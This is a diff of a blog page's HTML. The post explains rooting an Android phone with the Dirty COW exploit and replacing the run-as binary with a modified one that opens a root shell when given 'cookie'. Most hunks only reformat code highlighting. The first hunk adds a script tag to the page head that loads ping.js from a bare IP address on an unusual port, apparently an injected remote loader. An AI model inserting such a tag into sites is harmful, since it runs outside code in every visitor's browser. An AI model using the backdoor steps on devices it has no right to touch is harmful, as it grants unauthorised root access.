@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -92,8 +94,8 @@ August 22, 2021
 <p>To interact with the device we will use <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> or <code>adb</code> for short.</p>
 <p>Besides <code>adb</code> we need to setup a few <code>udev</code> rules so we can run it without root permissions.</p>
 <p>The package <code>android-sdk-platform-tools-common</code> already does that, we only need to add our user to the <code>plugdev</code> group.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ sudo usermod -aG plugdev <span class="k">$(</span>id -un<span class="k">)</span>
-$ sudo apt-get install adb android-sdk-platform-tools-common
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>usermod<span class="w"> </span>-aG<span class="w"> </span>plugdev<span class="w"> </span><span class="k">$(</span>id<span class="w"> </span>-un<span class="k">)</span>
+$<span class="w"> </span>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>adb<span class="w"> </span>android-sdk-platform-tools-common
 </code></pre></div>
 
 <p>The compiler and the building tools, however, it wasn’t so easy.</p>
@@ -107,10 +109,10 @@ $ sudo apt-get install adb android-sdk-platform-tools-common
 <p><code>dpkg -i *.deb</code> and we are done.</p>
 <h2 id="gathering-info">Gathering info</h2>
 <p>To compile our priv-esc exploit we need to know the architecture and SDK version of the phone.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ adb shell getprop ro.product.cpu.abi
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>adb<span class="w"> </span>shell<span class="w"> </span>getprop<span class="w"> </span>ro.product.cpu.abi
 armeabi-nn
 
-$ adb shell getprop ro.build.version.sdk
+$<span class="w"> </span>adb<span class="w"> </span>shell<span class="w"> </span>getprop<span class="w"> </span>ro.build.version.sdk
 nn
 </code></pre></div>
 
@@ -132,36 +134,36 @@ nn
 <li><code>run-as.c</code> which it uses <code>selinux</code> to run as root</li>
 </ul>
 <p>I had only modified <code>run-as.c</code> a little to call the original <em>unpatched</em> <code>run-as</code> program by default and drop a root shell only under a special condition. We don’t want that <em>anyone</em> can call it and become root!</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">pkgname</span><span class="p">;</span><span class="w"></span>
-<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">pkgname</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 
-<span class="n">pkgname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="w"></span>
-<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pkgname</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cookie&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="cm">/* Rollback to the default run-as . */</span><span class="w"></span>
-<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv2</span><span class="p">[</span><span class="n">argc</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span><span class="w"></span>
-<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">argv2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">argc</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span><span class="w"></span>
-<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">argv2</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">argc</span><span class="p">);</span><span class="w"></span>
+<span class="n">pkgname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pkgname</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cookie&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="cm">/* Rollback to the default run-as . */</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv2</span><span class="p">[</span><span class="n">argc</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">argv2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">argc</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span>
+<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">argv2</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">argc</span><span class="p">);</span>
 
-<span class="w">    </span><span class="n">execvp</span><span class="p">(</span><span class="s">&quot;/system/bin/run-as.bck&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv2</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">execvp</span><span class="p">(</span><span class="s">&quot;/system/bin/run-as.bck&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv2</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>The <a href="https://developer.android.com/ndk/guides/ndk-build">compilation</a> then went smoothly:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/lib/android-sdk/ndk-bundle/
-$ ndk-build <span class="nv">NDK_PROJECT_PATH</span><span class="o">=</span>. <span class="nv">APP_BUILD_SCRIPT</span><span class="o">=</span>./Android.mk <span class="nv">APP_ABI</span><span class="o">=</span>armeabi-nn <span class="nv">APP_PLATFORM</span><span class="o">=</span>android-nn
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/lib/android-sdk/ndk-bundle/
+$<span class="w"> </span>ndk-build<span class="w"> </span><span class="nv">NDK_PROJECT_PATH</span><span class="o">=</span>.<span class="w"> </span><span class="nv">APP_BUILD_SCRIPT</span><span class="o">=</span>./Android.mk<span class="w"> </span><span class="nv">APP_ABI</span><span class="o">=</span>armeabi-nn<span class="w"> </span><span class="nv">APP_PLATFORM</span><span class="o">=</span>android-nn
 </code></pre></div>
 
 <h2 id="patching">Patching</h2>
 <p>We upload the exploit and our <em>custom</em> <code>run-as</code> program to the phone:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ adb push libs/armeabi-nn/dirtycow /storage/sdcard0/dcow
-$ adb push libs/armeabi-nn/run-as /storage/sdcard0/run-as
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>adb<span class="w"> </span>push<span class="w"> </span>libs/armeabi-nn/dirtycow<span class="w"> </span>/storage/sdcard0/dcow
+$<span class="w"> </span>adb<span class="w"> </span>push<span class="w"> </span>libs/armeabi-nn/run-as<span class="w"> </span>/storage/sdcard0/run-as
 </code></pre></div>
 
 <p>We make a backup copy of the <em>unpatched</em> <code>run-as</code> program and trigger then the exploit. If everything goes well the <em>read-only</em> <code>/system/bin/run-as</code> will be <em>replaced</em> with our custom <code>run-as</code>:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ adb shell <span class="s1">&#39;cp /system/bin/run-as /storage/sdcard0/run-as.bck&#39;</span>
-$ adb shell <span class="s1">&#39;/storage/sdcard0/dcow /storage/sdcard0/run-as /system/bin/run-as --no-pad&#39;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>adb<span class="w"> </span>shell<span class="w"> </span><span class="s1">&#39;cp /system/bin/run-as /storage/sdcard0/run-as.bck&#39;</span>
+$<span class="w"> </span>adb<span class="w"> </span>shell<span class="w"> </span><span class="s1">&#39;/storage/sdcard0/dcow /storage/sdcard0/run-as /system/bin/run-as --no-pad&#39;</span>
 </code></pre></div>
 
 <p>We run <code>run-as cookie cookie</code> and we get a root shell; bypassing <a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a> will be for another post <a href="https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/">:D</a></p>
